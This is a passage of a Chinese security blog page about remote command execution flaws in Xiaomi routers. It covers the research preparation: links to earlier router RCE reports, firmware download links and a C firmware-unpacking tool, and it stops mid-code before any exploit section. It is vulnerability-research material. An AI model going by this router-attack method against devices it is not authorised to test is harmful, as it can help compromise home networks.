<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371） | UltramanGaia&#39;s Blog</title>
  <meta name="keywords" content=" 漏洞挖掘 , lua ">
  <meta name="description" content="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371） | UltramanGaia&#39;s Blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta property="og:type" content="website">
<meta property="og:title" content="tags">
<meta property="og:url" content="http://ultramangaia.github.io/tags/index.html">
<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2017-12-23T08:37:34.000Z">
<meta property="article:modified_time" content="2019-01-19T16:10:05.125Z">
<meta property="article:author" content="UltramanGaia">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 4.2.1"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
</div>


<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>UltramanGaia</span>
</div>

<div class="icon">
    
        
        <a title="rss" href="/atom.xml" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-rss"></use>
                </svg>
            
        </a>
        
    
        
        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-email"></use>
                </svg>
            
        </a>
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
</div>




<ul>
    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
    
        
            
            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="35">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">全部文章</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" />
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>代码执行</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>反序列化</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>机器学习</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>命令注入</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>请求走私</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件上传</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>智能合约</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ctf</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Java</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>lua</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>PHP</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>PWN</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>SQL</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sqlmap</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>writeup</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>XSS</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>XSSI</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>XXE</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ysoserial</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        <a id="top" class="全部文章 Web 漏洞挖掘 "
           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
           data-tag="漏洞挖掘,lua"
           data-author="" >
            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
        </a>
        
        <a id="top" class="全部文章 Web 漏洞挖掘 "
           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
           data-tag="请求走私"
           data-author="" >
            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
        </a>
        
        <a id="top" class="全部文章 Web 漏洞挖掘 "
           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
           data-tag="代码执行"
           data-author="" >
            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
        </a>
        
        <a  class="全部文章 Web 漏洞挖掘 "
           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
           data-tag="代码执行"
           data-author="" >
            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
        </a>
        
        <a  class="全部文章 Web 漏洞挖掘 "
           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
           data-tag="请求走私"
           data-author="" >
            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
        </a>
        
        <a  class="全部文章 Java Java安全 "
           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
           data-tag="Java,ysoserial,反序列化"
           data-author="" >
            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
           data-tag="XSSI"
           data-author="" >
            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
        </a>
        
        <a  class="全部文章 PHP 漏洞分析 "
           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
           data-tag="漏洞分析,ThinkPHP,SQL"
           data-author="" >
            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
        </a>
        
        <a  class="全部文章 其它 智能合约 "
           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
           data-tag="writeup,智能合约"
           data-author="" >
            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
        </a>
        
        <a  class="全部文章 其它 智能合约 "
           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
           data-tag="ctf,writeup,智能合约"
           data-author="" >
            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2018/starctf-ctf-2018.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2018/ddctf-ctf-2018.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
        </a>
        
        <a  class="全部文章 PHP 漏洞分析 "
           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
           data-tag="漏洞分析"
           data-author="" >
            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
        </a>
        
        <a  class="全部文章 PHP 漏洞分析 "
           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
           data-tag="漏洞分析"
           data-author="" >
            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
           data-tag="命令注入"
           data-author="" >
            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
           data-tag="XXE"
           data-author="" >
            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2018/0ctf-ctf-2018.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
           data-tag="XSS"
           data-author="" >
            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
        </a>
        
        <a  class="全部文章 二进制 PWN "
           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
           data-tag="PWN,stackoverflow"
           data-author="" >
            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2018/pragyan-ctf-2018.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
        </a>
        
        <a  class="全部文章 PHP PHP安全 "
           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
           data-tag="PHP"
           data-author="" >
            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2018/Xiomara-ctf-2018.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
           data-tag="SQL"
           data-author="" >
            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
           data-tag="文件上传"
           data-author="" >
            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
        </a>
        
        <a  class="全部文章 其它 机器学习 "
           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
           data-tag="机器学习"
           data-author="" >
            <span class="post-title" title="机器学习">机器学习</span>
            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/webug3-0-writeup.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/gctf-ctf-2017.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/pwn2win-ctf-2017.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
        </a>
        
        <a  class="全部文章 Web Writeup "
           href="/blog/2017/hitcon-ctf-2017.html"
           data-tag="ctf,writeup"
           data-author="" >
            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
        </a>
        
        <a  class="全部文章 Web Web安全 "
           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
           data-tag="ctf,sqlmap"
           data-author="" >
            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-Xiaomi-Series-Router-Command-Execution-Vulnerability" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</h1>
    
    <div class="article-meta">
        
        <span class="top"><a>置顶</a></span>
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="Web">Web</a> > 
            
            <a  data-rel="Web&lt;---&gt;漏洞挖掘">漏洞挖掘</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color5">漏洞挖掘</a>
            
            <a class="color4">lua</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            发布时间 : <time class="date" title='最后更新: 2020-07-17 01:01:55'>2019-03-09 14:41</time>
        
    </div>
    <div class="article-meta">
        
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-信息收集"><span class="toc-text">1. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#google-hacking"><span class="toc-text">google hacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#收获信息"><span class="toc-text">收获信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-固件获取-amp-解包"><span class="toc-text">2. 固件获取&amp;解包</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#固件获取"><span class="toc-text">固件获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#固件解包"><span class="toc-text">固件解包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-固件分析"><span class="toc-text">3. 固件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web漏洞分析"><span class="toc-text">Web漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#任意文件读取漏洞"><span class="toc-text">任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用任意文件读取漏洞实现后台登录"><span class="toc-text">利用任意文件读取漏洞实现后台登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行漏洞"><span class="toc-text">命令执行漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-漏洞影响"><span class="toc-text">4. 漏洞影响</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>discoverer: UltramanGaia &amp; Zhiniang Peng from 360 Core Security</p>
</blockquote>
<h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h1><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><p><a href="http://www.wooyun.org/bug.php?action=view&id=58818" target="_blank" rel="noopener">小米路由器稳定版固件root用户弱口令</a></p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=58909" target="_blank" rel="noopener">小米路由器参数过滤不严命令执行漏洞</a></p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=59139" target="_blank" rel="noopener">小米路由器隐私盘功能可绕过访问控制</a></p>
<p><a href="https://shuimugan.com/bug/view?bug_no=60960" target="_blank" rel="noopener">小米路由器参数过滤绕过命令执行漏洞2</a></p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=129067" target="_blank" rel="noopener">小米路由器管理页面任意命令执行能够拿到系统控制权</a></p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=154775" target="_blank" rel="noopener">小米路由器过滤不严可root权限修改启动项开ssh</a></p>
<p><a href="https://www.92aq.com/2016/01/20/openwrt-xiaomi-loudong.html" target="_blank" rel="noopener">Openwrt漏洞挖掘之不要用小米路由偷偷下小电影哦</a></p>
<p><a href="https://xs3c.co/archives/370" target="_blank" rel="noopener">小米路由器_hookWifiConnect函数RCE漏洞</a></p>
<p><a href="http://toutiao.secjia.com/article/page?topid=104498" target="_blank" rel="noopener">小米路由器HD(R3D)爆出远程代码执行漏洞CVE-2018-14060</a></p>
<blockquote>
<p>在2.26.4设备之前，小米R3D上的/ cgi-bin / luci / api / misystem / set_router_wifiap中的AP模式设置功能中的OS命令注入允许攻击者通过精心制作的JSON数据执行任何命令。</p>
</blockquote>
<h2 id="收获信息"><a href="#收获信息" class="headerlink" title="收获信息"></a>收获信息</h2><ul>
<li><p>小米路由器型号多，功能比较多，洞也挺多的</p>
</li>
<li><p>路由器固件结构  –&gt;  找到了解压固件的方法</p>
</li>
<li><p>路由器操作系统  –&gt;  OpenWrt</p>
</li>
<li><p>路由器Web          –&gt;  LuCI</p>
</li>
<li><p>常见漏洞（开发人员知识盲点）</p>
</li>
</ul>
<h1 id="2-固件获取-amp-解包"><a href="#2-固件获取-amp-解包" class="headerlink" title="2. 固件获取&amp;解包"></a>2. 固件获取&amp;解包</h1><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p>固件获取方式常见有两种，一是官网下载，二是硬件提取。这里，小米路由器官方就提供了下载<a href="http://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_7a388_2.28.23.bin" target="_blank" rel="noopener">ROM for R3G 稳定版2.28.23（12月2日更新）</a>和<a href="http://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin" target="_blank" rel="noopener">ROM for R3G 开发版2.25.124（10月30日更新）</a>。</p>
<h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>在前面的信息收集阶段，我们已经知道了固件的解压方式。</p>
<p><a href="http://www.iptvfans.cn/wiki/index.php/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8mini%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90" target="_blank" rel="noopener">小米路由器mini固件分析</a></p>
<p>xiaomi_extract.c</p>
<pre><code class="c">#include &lt;stdio.h&gt;

struct {
    char magic[4];
    int size;
    unsigned int crc;
    short type;
    short model;
    unsigned int offset[4];
} header;

struct {
    char magic[4];
    unsigned int reserved;
    int size;
    unsigned int reserved2;
    char filename[32];
} section;

int main(int argc, char *argv[]) {
    int i, j;
    int size;
    FILE *input;
    FILE *output;
    char buffer[1024];

    if (argc &lt; 2) {
        fprintf(stderr, &quot;Usage: split filename\n&quot;);
        return 1;
    }
    if ((input = fopen(argv[1], &quot;rb&quot;)) == NULL) {
        fprintf(stderr, &quot;File %s open error\n&quot;, argv[1]);
        return 1;
    }
    if (fread(&amp;header, 1, sizeof(header), input) != sizeof(header)) {
        fprintf(stderr, &quot;File %s read error\n&quot;, argv[1]);
        return 1;
    }
    for (i=0; i&lt;4; i++) {
        if (header.offset[i] == 0)
            continue;
        fseek(input, header.offset[i], SEEK_SET);
        if (fread(&amp;section, 1, sizeof(section), input) != sizeof(section))
            continue;
        if ((output = fopen(section.filename, &quot;wb&quot;)) == NULL) {
            fprintf(stderr, &quot;File %s open error\n&quot;, section.filename);
            continue;
        }
        printf(&quot;Create file %s\n&quot;, section.filename);
        for (j=0; j&lt;section.size; j+=sizeof(buffer)) {
            size = section.size-j;
            if (size &gt; sizeof(buffer))size = sizeof(buffer);
            if (fread(buffer, 1, size, input) != size)
                break;
